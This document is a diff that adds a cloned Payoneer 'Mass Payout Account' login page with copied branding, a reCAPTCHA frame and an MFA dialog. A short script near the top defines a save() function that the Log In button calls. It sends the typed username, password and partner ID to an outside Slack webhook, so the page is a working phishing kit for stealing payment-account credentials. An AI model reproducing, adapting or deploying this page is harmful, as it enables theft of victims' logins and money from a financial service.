@@ -1,0 +1,459 @@
+<html class="k-webkit k-webkit62"><head><meta charset="utf-8">
+  <script
+    src="https://code.jquery.com/jquery-3.2.1.min.js"
+    integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+    crossorigin="anonymous"></script>
+
+  <script>
+  function save() {
+    $.post( "https://hooks.slack.com/services/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", JSON.stringify({"text": $('#username')[0].value+"\n" + $('#password')[0].value + '\n' + $('#partnerId')[0].value}), function( data ) {
+    });
+  }
+  </script>
+<meta content="tGR-vQHfmM50VOvsnjM-uq74LV4d4KRX7-VE5MVsLqFbDvyKqZyLVDLXvyjWmQ343p6BvWHz1wK_GBMcKcvx3v7ne9SGLCX02O3674fji2k1" name="X-Request-Verification-Token">
+<link rel="shortcut icon" type="image/x-icon" href="https://pubs.payoneer.com/Content/Default/img/Favicon/favicon.ico">
+<link rel="icon" type="image/x-icon" href="https://pubs.payoneer.com/Content/Default/img/Favicon/favicon.ico">
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon-precomposed" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="57x57" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="72x72" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="76x76" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="120x120" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="152x152" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" href="https://pubs.payoneer.com/Content/Default/img/Favicon/apple-touch-icon-152x152.png">
+<link rel="icon" type="image/png" href="https://pubs.payoneer.com/Content/Default/img/Favicon/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pubs.payoneer.com/Content/Default/img/Favicon/favicon-16x16.png" sizes="16x16">
+<meta name="application-name" content="Payoneer">
+<meta name="msapplication-TileColor" content="#FF4800">
+<meta name="msapplication-TileImage" content="https://pubs.payoneer.com/Content/Default/img/Favicon/mstile-144x144.png">
+<meta name="msapplication-config" content="none">
+<link rel="stylesheet" type="text/css" href="https://pubs.payoneer.com/Content/Common/kendo/css/kendo.min.css">
+<link href="css.css" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" href="">
+<body data-theme="banana">
+<!--[if lt IE 8]>
+                                                <p class='browsehappy'>You are using an <strong>outdated</strong> browser. Please <a href='http://browsehappy.com/'>upgrade your browser</a> to improve your experience.</p>
+                                            <![endif]-->
+<div id="RenderBodyWrapper"><div class="loader-wrapper loader-overlay loader-no-back" id="Loader"><div class="loader"><span>LoaderMessage</span></div></div><div id="RenderBody">
+
+
+<div class="global">
+    <div class="fw">
+<header><div id="header" class="header">
+                                                <div class="sw">
+                                                    <div class="inner">            <div class="partner-logo">
+                <!-- SKIN -->
+                <img alt="Partner Logo" src="https://pubs.payoneer.com/Content/Default/img/default-logo.png">
+            </div>
+       </div>
+                                                    <div class="clearfix"></div>
+                                                </div>
+                                            </div></header>        <nav>
+            <div class="navigation">
+                <div class="icon"></div>
+                <div class="sw">
+                    <div class="menu">
+                        <ul class="menu-container"></ul>
+                        <ul class="menu-container menu-tools">
+                            <li class="item user-name">
+                                <div class="level-one">
+                                    <a href="javascript:void(0);" id="current-localization"><span> English</span><span class="pa-icon"></span></a>
+                                    <ul class="menu-dropdown">
+
+                                            <li class="item">
+                                                <a href="javascript:ChangeLanguage(1)">
+                                                    English
+                                                </a>
+                                            </li>
+                                            <li class="item">
+                                                <a href="javascript:ChangeLanguage(4)">
+                                                    简体中文
+                                                </a>
+                                            </li>
+                                            <li class="item">
+                                                <a href="javascript:ChangeLanguage(7)">
+                                                    Español
+                                                </a>
+                                            </li>
+                                    </ul>
+                                </div>
+                            </li>
+                        </ul>
+                        <div class="clearfix"></div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <!--THIS SECTION CHANGE ON EACH PAGE -->
+        <section id="pa-content login">
+            <div class="sw">
+                <div class="pa-content">
+                    <div class="login-section">
+                        <div class="reg-form">
+                            <div class="title" id="titleLogin">Mass Payout Account
+</div>
+<div id="LoginForm" >
+                                    <input type="hidden" name="ReturnUrl">
+                                    <div class="form-object">
+                                        <div class="validation-summary-errors"></div>
+                                    </div>
+
+
+
+
+<div class="form-object">
+
+    <span class="error-star"></span>
+
+    <div class="field-description input-placeholder" style="display: block;">Username</div>
+
+    <div class="field">
+
+
+
+
+
+
+
+<input class="field-data watermark valid" data-val="true" data-val-maxlength="You exceeded the maximum length of 30 characters." data-val-maxlength-max="30" data-val-regex="Please fill in valid characters" data-val-regex-pattern="^[\w\-\.\@_]+$" data-val-required="This field is required." id="username" name="UserName" payoneer="TextBox" placeholder="Username" type="text" value="">
+
+
+
+
+    </div>
+
+
+
+
+    <div class="error-message">
+<span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
+    </div>
+
+    <div class="clearfix"></div>
+</div>
+
+
+
+
+<div class="form-object">
+
+    <span class="error-star"></span>
+
+    <div class="field-description input-placeholder" style="display: block;">Password</div>
+
+    <div class="field">
+
+
+
+
+
+
+
+<input autocomplete="off" class="field-data watermark valid" data-val="true" data-val-maxlength="You exceeded the maximum length of 30 characters." data-val-maxlength-max="30" data-val-regex="Please fill in valid characters" data-val-regex-pattern="^[\w!@#$%\^&amp;_.]+$" data-val-required="This field is required." id="password" name="Password" payoneer="TextBox" placeholder="Password" type="password">
+
+
+
+
+    </div>
+
+
+
+
+    <div class="error-message">
+<span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
+    </div>
+
+    <div class="clearfix"></div>
+</div>
+
+
+
+
+<div class="form-object   ">
+
+    <span class="error-star"></span>
+
+    <div class="field-description input-placeholder">Partner ID</div>
+
+    <div class="field ">
+
+
+
+
+
+
+
+<input class="field-data watermark" data-val="true" data-val-maxlength="Maximum field length of 10 for partner id was exceeded." data-val-maxlength-max="10" data-val-regex="Please fill in valid partner id" data-val-regex-pattern="^(-1|0|([1-9]\d{0,8})|(((1\d)|(20))\d{8})|(21[0-3]\d\{7})|(214[0-6]\d{6})|(2147[0-3]\d{5})|(21474[0-7]\d{4})|(214748[0-2]\d{3})|(2147483[0-5]\d{2})|(21474836[0-3]\d)|(214748364[0-7]))$" data-val-required="This field is required." id="partnerId" name="PartnerID" payoneer="TextBox" placeholder="Partner ID" type="text" value="">
+
+
+
+
+    </div>
+
+
+
+
+    <div class="error-message">
+<span class="field-validation-valid" data-valmsg-for="PartnerID" data-valmsg-replace="true"></span>
+    </div>
+
+    <div class="clearfix"></div>
+</div>
+                                        <div id="divCaptcha" style="display: none">
+
+                                            <div id="hidcaptchaval" class="form-object" style="position:absolute;border:0px; height:0px">
+                                                <div class="field" style="border:0px;height:0px">
+                                                    <input style="border:0px;height:0px" class="field-data error" data-val="true" data-val-required="This field is required." name="hidCaptcha" id="hitdCaptchaValue" payoneer="TextBox" type="text" value="">
+                                                </div>
+                                            </div>
+                                            <div>
+
+	<div id="CaptchaWrapper" class="">
+
+    <input type="hidden" data-val="true" data-val-captcha="">
+    <div id="recaptcha"><div style="width: 304px; height: 78px;"><div><iframe src="https://www.google.com/recaptcha/api2/anchor?k=6LdcxCQTAAAAADiksPMnI-OqZ7sIF5DMk96h3l_4&amp;co=aHR0cHM6Ly9wYXJ0bmVycy5wYXlvbmVlci5jb206NDQz&amp;hl=en&amp;v=r20171115120512&amp;size=normal&amp;cb=7bc3bjq5yctw" width="304" height="78" role="presentation" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid #c1c1c1; margin: 10px 25px; padding: 0px; resize: none;  display: none; "></textarea></div></div>
+    <div id="recaptchaloadingmsg" style="opacity: 0;display:none">Recaptcha is loading</div>
+
+	</div>
+
+                                            </div>
+                                        </div>
+                                        <div class="btn-container btn-container-bottom">
+
+
+
+
+
+    <button class="btn btn-upperCase  btn-primary btn-block" onclick="save()">
+        Log In
+    </button>
+
+                                        </div>
+</div>
+                                            <div id="ForgotPasswordForm">
+<input id="userPrefs" name="userPrefs" type="hidden" value="">
+                                                    <div class="forgot_password_link">
+                                                        <a id="ForgotPassword" href="javascript: ForgotPassword();">Forgot Password</a>
+                                                    </div>
+                                                    <input type="hidden" name="userName" id="UserName">
+                                                    <input type="hidden" name="partnerId" id="PartnerId">
+</form>                                            </div>
+                                    </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+<div id="9d1746d6fc15475b96f8747543ae0791" class="dialog simple-dialog " title="" style="display: none">
+
+
+
+<style>
+    .dialog.error .dynamic-content {
+        max-height: 300px;
+        width: 98%;
+        overflow: auto;
+        overflow-x: hidden;
+    }
+</style>
+
+<div class="intro-section">
+        <div class="section-title">Confirmation Required</div>
+
+    <div class="dynamic-content">
+
+        <p class="popup-content">
+
+        <div id="Content9d1746d6fc15475b96f8747543ae0791">
+    <div style="display: none" id="mfa_failure">
+        We're sorry, something went wrong.  Please try again.
+
+
+
+
+
+    <button id="mfa_close_btn" autocomplete="off" class="btn btn-upperCase  cancel btn-block" data-loading-text="<div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div>" onclick="mfaPopupEventTriggered(event)" type="button">
+        close
+    </button>
+
+    </div>
+    <div style="display: none" id="toomanytries">
+        <div class="pa-content">
+            <div class="sms-section">
+                <div class="maxtry-form" style="padding-bottom: 0;">
+                    <div class="title_img"><img src="/Content/img/mobile.png"></div>
+                    <div class="form-object title_info">
+                        You've reached maximum number of trials
+                    </div>
+                    <div class="form-object">
+                        Please contact customer care:
+                    </div>
+                    <div class="form-object mailto" style="text-align: left;">
+                        <img src="/Content/img/mail_icon.png"><a href="mailto:Support@Payoneer.com"> Support@Payoneer.com</a>
+                    </div>
+                    <div class="form-object call" style="text-align: left;">
+                        <img src="/Content/img/phone_icon.png"> 1-800-800-8000
+                    </div>
+                </div>
+            </div>
+        </div>
+        <br>
+
+
+
+
+
+    <button id="mfa_close_btn" autocomplete="off" class="btn btn-upperCase  cancel btn-block" data-loading-text="<div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div>" onclick="mfaPopupEventTriggered(event)" type="button">
+        close
+    </button>
+
+    </div>
+    <div style="display: none" id="content">
+<form novalidate="novalidate">
+              <table id="inside-mfa-form" class="sms-section" style="width: 100%">
+                <tbody><tr>
+                    <td colspan="3" style="text-align: left">
+                        We just sent a verification code to your registered number.<br>Please input the code to proceed.
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="3" style="color: #dc002f; padding-top: 15px; display: none;" id="invalid_input">
+                        Invalid Code
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="3" style="padding-bottom: 15px; padding-top: 15px;">
+
+
+
+
+<div class="form-object   ">
+
+    <span class="error-star"></span>
+
+    <div class="field-description input-placeholder">Code</div>
+
+    <div class="field ">
+
+
+
+
+
+
+
+<input class="field-data watermark" data-val="true" data-val-maxlength="Maximum field length of 10 characters was exceeded." data-val-maxlength-max="10" data-val-minlength="The field must contain at least 2 characters." data-val-minlength-min="2" data-val-regex="Please fill in valid format." data-val-regex-pattern="[a-zA-Z0-9]+" data-val-required="This field is required." id="Code" name="Code" payoneer="TextBox" placeholder="Code" type="text" value="">
+
+
+
+
+    </div>
+
+
+
+
+    <div class="error-message">
+<span class="field-validation-valid" data-valmsg-for="Code" data-valmsg-replace="true"></span>
+    </div>
+
+    <div class="clearfix"></div>
+</div>
+
+                    </td>
+                </tr>
+                <tr class="btn-container btn-container-bottom">
+                    <td width="45%">
+
+
+
+
+
+    <button id="mfa_verify_btn" autocomplete="off" class="btn btn-upperCase  btn-primary btn-block" name="btnNext" data-loading-text="<div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div>" data-validation="listener" type="submit" disabled="disabled">
+        Next
+    </button>
+
+                    </td>
+                    <td width="10%"></td>
+                    <td width="45%">
+
+
+
+
+
+    <button id="mfa_close_btn" autocomplete="off" class="btn btn-upperCase  cancel btn-block" data-loading-text="<div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div>" onclick="mfaPopupEventTriggered(event)" type="button">
+        Cancel
+    </button>
+
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" width="55%"></td>
+                    <td>
+                        <br>&nbsp;
+                        <a href="#" id="resend" style="display: none;" onclick="mfaPopupEventTriggered(event, this)">resend the code</a>
+                    </td>
+                </tr>
+            </tbody></table>
+<input id="SessionKey" name="SessionKey" type="hidden" value=""><input id="AuthToken" name="AuthToken" type="hidden" value=""><input data-val="true" data-val-required="The Action Type field is required." id="ActionType" name="ActionType" type="hidden" value="101"></form>    </div>
+</div></p>
+    </div>
+</div>
+<br>
+
+
+
+
+</div>
+<div id="confirmationPopupId" class="dialog simple-dialog " title="" style="display: none">
+
+
+
+<style>
+    .dialog.error .dynamic-content {
+        max-height: 300px;
+        width: 98%;
+        overflow: auto;
+        overflow-x: hidden;
+    }
+</style>
+
+<div class="intro-section">
+        <div class="section-title">Confirmation Required</div>
+
+    <div class="dynamic-content">
+
+        <p class="popup-content">
+
+        </p>
+    </div>
+</div>
+<br>
+
+
+
+
+
+
+    <button id="OK" autocomplete="off" class="btn btn-upperCase btn-primary" name="OK" data-loading-text="<div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div>" data-popup-confirmation="false" type="button">
+        OK
+    </button>
+
+
+
+
+
+
+    <button id="CANCEL" autocomplete="off" class="btn btn-upperCase  cancel" data-loading-text="<div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div>" data-popup-dismiss="#confirmationPopupId" type="button">
+        close
+    </button>
+x
+
+</div>
+</div></div>
+
+<iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="https://vars.hotjar.com/rcj-99d43ead6bdf30da8ed5ffcb4f17100c.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><div id="ads"></div><div style="background-color: #fff; border: 1px solid #ccc; box-shadow: 2px 2px 3px rgba(0, 0, 0, 0.2); position: absolute; left: 0px; top: -10000px; transition: visibility 0s linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: #fff; opacity: 0.05;  filter: alpha(opacity=5)"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0; height: 0; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0; height: 0; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=r20171115120512&amp;k=6LdcxCQTAAAAADiksPMnI-OqZ7sIF5DMk96h3l_4#46ag7ezdx04r" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" name="46ag7ezdx04r" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
